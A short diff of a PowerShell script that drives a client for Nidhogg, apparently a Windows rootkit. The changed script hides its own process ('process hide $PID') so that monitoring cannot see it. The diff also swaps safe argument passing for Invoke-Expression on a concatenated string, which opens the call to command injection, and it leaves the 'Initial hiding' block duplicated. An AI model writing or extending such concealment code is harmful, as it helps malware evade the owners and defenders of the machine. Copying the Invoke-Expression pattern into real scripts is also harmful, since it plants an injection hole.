@@ -14,10 +14,13 @@ function Log($msg) {
 function Invoke-Nidhogg {
     param([string]$Cmd)
     if (Test-Path $NidhoggClient) {
-        # Splits the string into separate arguments so the .exe can read them
-        & $NidhoggClient $Cmd.Split(' ')
+        # The backticks escape the quotes around the path in case of spaces
+        Invoke-Expression "& `"$NidhoggClient`" $Cmd"
     }
 }
+
+# Initial hiding
+Invoke-Nidhogg "process hide $PID"
 
 # Initial hiding
 Invoke-Nidhogg "process hide $PID"
